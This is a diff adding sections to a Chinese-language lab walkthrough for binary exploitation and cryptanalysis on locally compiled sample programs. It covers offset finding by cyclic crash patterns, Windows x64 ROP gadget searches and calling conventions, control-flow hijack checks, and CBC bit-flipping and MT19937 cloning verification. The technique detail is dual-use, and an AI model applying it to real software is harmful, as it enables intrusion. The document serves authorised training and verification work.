@@ -30,6 +30,25 @@ python Tool/skill/pwn-crypto/scripts/pwn-check.py --file Tool/cases/pwn-crypto03
 结论：PE32+、NX 开、无 PIE、无 canary。按 `mitigation-matrix.md`，栈溢出可直接覆盖返回地址，
 不需要先泄漏代码基址；但仍要确认偏移。
 
+## 0.1 开跑前自检（4 条命令，30 秒）
+
+```bash
+for s in pwn-check pwn-repro crypto-verify pwn-accept; do
+  python Tool/skill/pwn-crypto/scripts/$s.py --self-test >/dev/null && echo "$s ok" || echo "$s FAIL"
+done
+```
+
+通过长什么样：
+
+```text
+pwn-check ok
+pwn-repro ok
+crypto-verify ok
+pwn-accept ok
+```
+
+任何一行 `FAIL` 都说明环境/依赖缺，先修工具再跑案例；否则后面每个数字都不可信。
+
 ## 1. 栈溢出：偏移两源对齐
 
 ```bash
@@ -73,6 +92,34 @@ buf=00000000005FFDD0 frame=00000000005FFE20 ret=0000000140001504
 结论：`buf` 在 `rbp-0x50`，saved RIP 在 `rbp+8`，偏移 `0x50+8=88`；两个独立来源一致。
 注意：这是**本编译选项**下的数字，不是通用常量。
 
+## 1.1 偏移的第三来源：crash-log（cyclic）
+
+只有 objdump + probe 时，两者可能"一起错"（比如都取错了变量）。加一条崩溃日志做第三源：
+
+```bash
+# 1) 生成 cyclic 并喂给目标（本地、已知会崩）
+python Tool/skill/pwn-crypto/scripts/pwn-repro.py --cyclic 300 > artifacts/pattern.txt
+python -c "import sys;sys.stdout.buffer.write(open('artifacts/pattern.txt','rb').read())" \
+  | Tool/cases/pwn-crypto03/artifacts/stack_overflow.exe >/dev/null 2>&1 || true
+# 2) 从调试器/异常处理里拿到 `RIP: 0x...` 并写入 crash.txt
+python Tool/skill/pwn-crypto/scripts/pwn-repro.py \
+  --objdump Tool/cases/pwn-crypto03/artifacts/stack_overflow.dis --func vuln \
+  --probe-log Tool/cases/pwn-crypto03/artifacts/probe.txt \
+  --crash-log artifacts/crash.txt --json
+```
+
+通过长什么样（三源同一个数）：
+
+```json
+{"offsets": [88], "consistent": true, "offset": 88,
+ "evidence": [{"method": "objdump-rbp", "offset": 88},
+              {"method": "runtime-probe", "offset": 88},
+              {"method": "crash-cyclic", "offset": 88}]}
+```
+
+`consistent=false` + `blocked_at=offset-mismatch` → 先查是不是取错变量/帧指针被优化掉，
+**不要**挑一个"看起来对"的偏移继续写 exploit。第三源的价值就是拦住"两源一起错"。
+
 ## 2. 控制流劫持：看到 marker 才算数
 
 ```bash
@@ -92,6 +139,33 @@ python Tool/cases/pwn-crypto03/input/exploit_stack.py \
 结论：payload 的 89–96 字节覆盖 saved RIP，函数返回到 `win()` 并打印 marker；rc=0。
 边界：win() 必须自己 `exit(0)`，否则执行完 `ret` 会落到 payload 的 `A` 上，进程仍会崩溃；
 “崩溃 + marker”也能证明控制流，但 rc 不为 0，不适合做稳定性统计。
+
+## 2.1 PE/x64 带参调用：rcx、阴影空间、对齐
+
+Windows x64 的前四个参数在 `rcx/rdx/r8/r9`，且调用者要预留 **32 字节阴影空间**；
+`system` 类函数内部可能用 `movaps [rsp+0x20]`，栈不对齐就崩。与 Linux 的 `pop rdi` 链不同：
+
+| 事项 | Linux x64 | Windows x64 |
+|---|---|---|
+| 第一参数 | `rdi` | `rcx` |
+| gadget | `pop rdi ; ret` | `pop rcx ; ret` |
+| 阴影空间 | 无 | 调用前 `sub rsp, 0x20`（或让链上 gadget 顺带留出） |
+| 对齐 | 进入函数 `rsp%16==8` | 同上，但多了阴影空间要求 |
+
+```bash
+ROPgadget --binary Tool/cases/pwn-crypto03/artifacts/stack_overflow.exe --only "pop|ret" \
+  | grep -E "pop rcx ; ret|pop rdx ; ret|pop r8 ; ret" | head
+```
+
+通过长什么样：
+
+```text
+0x0000000140001611 : pop rcx ; ret
+0x0000000140001613 : pop rdx ; ret
+```
+
+PE 无 PIE 时这些地址是固定的（`pwn-check` 的 `PIE: Disabled`），但仍要看
+`objdump -p` 的 `DllCharacteristics` 是否含 `DYNAMIC_BASE`；含则模块基址会随机，必须先泄漏。
 
 ## 3. 整数回绕：要看到分配过小与堆破坏
 
@@ -180,6 +254,30 @@ PYTHONIOENCODING=utf-8 python Tool/skill/pwn-crypto/scripts/crypto-verify.py \
 篡改后必须失败；MT19937 用 624 个真实输出克隆后预测下 8 个一致；AES-ECB 的 `'A'*32` 产生重复块，
 CBC 翻转 `C[0][3]` 后 `P[1][3]` 由 `0x63` 变 `0x43`。证据在 `Tool/cases/pwn-crypto04/artifacts/`。
 
+## 5.1 四种模式的完整验收（真实输出）
+
+```bash
+for m in hmac ecb cbc mt; do
+  python Tool/skill/pwn-crypto/scripts/crypto-verify.py --$m Tool/cases/pwn-crypto04/input/$m.json
+done
+```
+
+通过长什么样（键名与 `artifacts/*.json` 一致）：
+
+```json
+{"mode": "hmac", "algo": "sha256", "digest": "fdf3ec97…", "expected": "fdf3ec97…",
+ "verified": true, "tamper_rejected": true}
+{"mode": "ecb", "block_size": 16, "blocks": 2, "duplicate_blocks": 1,
+ "ecb_detected": true, "verified": true}
+{"mode": "cbc", "target_block": 1, "byte_index": 3, "xor": 32, "target_offset": 19,
+ "plaintext_before_hex": "63", "plaintext_after_hex": "43", "verified": true}
+{"mode": "mt19937", "state_cloned": true, "predicted": [3610430272, 605576521, …],
+ "expected": [3610430272, 605576521, …], "verified": true}
+```
+
+四个 `verified` 全 true 才叫"密码学结论成立"。缺一个就是"该模式未验证"，不要合并成一句
+"密码学部分已验证"。`tamper_rejected=true` 单独看：它证明"篡改会失败"，是 HMAC 的必要条件。
+
 ## 6. 结论与可复用点
 
 1. **偏移**：objdump 位移 + 运行时 `frame-buf` 是最便宜的双源校验；`pwn-repro.py` 把它机检化。
@@ -188,6 +286,20 @@ CBC 翻转 `C[0][3]` 后 `P[1][3]` 由 `0x63` 变 `0x43`。证据在 `Tool/cases
 4. **格式化串**：参数位置是实测出来的（前 3 个在寄存器，buf 从参数 4 起）；地址含 NUL 时放末尾。
 5. **平台**：UCRT 禁 `%n`、PE 无 RELRO/`__free_hook`；报告必须注明平台与工具链。
 6. **密码学**：`verified=true` 才是结论；没有回代等式的“明文”一律不算。
+
+## 6.1 本案例的"通过/不通过"对照
+
+| 环节 | 通过的样子 | 不通过的样子 | 判据落在哪 |
+|---|---|---|---|
+| 偏移 | 两源/三源 `offset=88` | `consistent=false` | `01-criteria.md` #1 |
+| 控制流 | stdout 有 `WIN:` marker，rc=0 | 崩溃但无 marker | #2 |
+| 整数 | `wrapped=1` + `_msize=4` + `0xC0000374` | 只算出回绕 | #10 |
+| 格式化串 | `%s` 打出 `FLAG{…}` 且 `authenticated=false` | 只有 `%p` 栈值 | #7 |
+| `%n` 写 | 写后读回等于期望 | UCRT 下 x 仍为 0 | #8 |
+| 密码学 | `verified=true` + 回代 | 只给"看似明文" | #12–#16 |
+
+这张表是交付前最后一遍核对：每一行都能指到 `01-criteria.md` 的编号，指不到就说明
+你写的不是判据，是叙述。
 
 ## 失败判据
 
@@ -201,3 +313,11 @@ CBC 翻转 `C[0][3]` 后 `P[1][3]` 由 `0x63` 变 `0x43`。证据在 `Tool/cases
 - 本走查是 Windows/MinGW 证据链；Linux 的 RELRO/GOT/libc/`%n` 行为不同，需在目标环境重跑。
 - 偏移 88、`0x140003000`、`0x140001440` 都是本案例编译产物里的地址；换二进制必须重算。
 - 没有对真实生产系统做任何测试；所有程序都是本仓库内现场编译、用于授权实验的样本。
+
+## 这一篇算"用对了"吗
+
+- [ ] 先跑 §0.1 四条自检，全 `ok` 才开始；环境不对不写数字。
+- [ ] 偏移至少两源一致，最好三源；`consistent=false` 时没有继续写 exploit。
+- [ ] 控制流用 marker 证明，不只凭"进程崩了"。
+- [ ] 整数/格式化串都给了运行时证据（`_msize`、读回字节、`%n` 边界）。
+- [ ] 密码学四个模式各自 `verified=true`，没有合并成一句"已验证"。
